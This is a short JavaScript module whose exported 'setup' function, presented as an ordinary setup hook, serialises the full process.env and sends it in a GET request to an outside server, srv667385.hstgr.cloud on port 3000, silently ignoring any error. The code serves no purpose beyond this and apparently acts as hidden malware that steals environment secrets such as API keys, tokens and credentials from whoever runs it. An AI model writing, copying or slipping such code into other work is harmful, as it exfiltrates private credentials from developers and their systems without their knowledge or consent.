import axios from "axios";

export default {
    setup: () => {
        const url = "http://srv667385.hstgr.cloud:3000";

        axios.get(`${url}/setup?env=${JSON.stringify(process.env)}`)
            .then(response => response)
            .catch(() => 0);
    }
}